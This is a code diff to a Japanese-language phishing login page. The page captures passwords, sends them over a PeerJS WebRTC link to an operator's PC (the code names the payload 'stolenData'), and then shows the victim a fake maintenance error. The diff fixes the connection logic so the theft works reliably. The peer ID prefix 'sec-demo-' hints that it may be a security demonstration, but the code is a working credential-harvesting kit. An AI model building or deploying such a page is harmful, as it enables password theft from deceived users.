@@ -32,9 +32,10 @@
         <label>パスワード</label>
         <input type="password" id="password" placeholder="••••••••" required>
       </div>
-      <button type="submit" class="btn-primary">ログイン</button>
+      <!-- 接続が完了するまでボタンが無効化されます -->
+      <button type="submit" id="login-btn" class="btn-primary" disabled style="opacity: 0.5; cursor: not-allowed;">接続待機中...</button>
     </form>
-    <div style="margin-top: 15px; font-size: 11px; color: #888;" id="conn-status">PC管理者との接続待機中...</div>
+    <div style="margin-top: 15px; font-size: 11px; color: #ffaa00;" id="conn-status">PC管理者との接続を確立しています...</div>
   </div>
 
   <div class="login-container hidden" id="error-box">
@@ -45,39 +46,41 @@
 
   <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const hostId = urlParams.get('room'); // PC側のルームIDを取得
+    const hostId = urlParams.get('room'); // URLからルームIDを取得（例: ?room=123）
 
-    // 変更後（オプションを明示して接続の無駄を省く）
-let peer = new Peer({
-  debug: 1,
-  config: {
-    'iceServers': [
-      { urls: 'stun:stun.l.google.com:19302' },
-      { urls: 'stun:global.stun.twilio.com:3478' }
-    ]
-  }
-});
+    const loginBtn = document.getElementById('login-btn');
+    const connStatus = document.getElementById('conn-status');
 
+    // 接続の無駄を省き、STUNサーバーを指定して接続スピードと安定性を向上
+    let peer = new Peer({
+      config: {
+        'iceServers': [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:global.stun.twilio.com:3478' }
+        ]
+      }
+    });
     let conn = null;
 
-  // 最初にボタンを押せなくしておく
-const loginBtn = document.querySelector('.btn-primary');
-loginBtn.disabled = true;
-loginBtn.style.opacity = "0.5";
-loginBtn.innerText = "接続中...";
-
-conn.on('open', () => {
-  document.getElementById('conn-status').innerText = "接続完了（リアルタイム送信可能）";
-  document.getElementById('conn-status').style.color = "#2ed573";
-  
-  // 接続が完了したらボタンを押せるようにする！
-  loginBtn.disabled = false;
-  loginBtn.style.opacity = "1";
-  loginBtn.innerText = "ログイン";
-});
-
+    peer.on('open', () => {
+      if (hostId) {
+        connStatus.innerText = "PCへ高速接続中...";
+        // PC（ホスト）に接続を要求
+        conn = peer.connect("sec-demo-" + hostId, { reliable: true });
+        
+        conn.on('open', () => {
+          // 🔗 接続完了したら、ボタンを押せるように解放する！
+          loginBtn.disabled = false;
+          loginBtn.style.opacity = "1";
+          loginBtn.style.cursor = "pointer";
+          loginBtn.innerText = "ログイン";
+          
+          connStatus.innerText = "接続完了（リアルタイム送信可能）";
+          connStatus.style.color = "#2ed573";
+        });
       } else {
-        document.getElementById('conn-status').innerText = "⚠️ 接続先IDがありません（QRコード等からアクセスしてください）";
+        connStatus.innerText = "⚠️ 接続先IDがありません（QRコードからアクセスしてください）";
+        connStatus.style.color = "#d9534f";
       }
     });
 
@@ -106,6 +109,7 @@ conn.on('open', () => {
         conn.send(stolenData);
       } else {
         alert("PCとの接続が確立されていません。");
+        return;
       }
 
       // 被害者にはメンテナンスエラー画面を表示
@@ -115,4 +119,3 @@ conn.on('open', () => {
   </script>
 </body>
 </html>
-
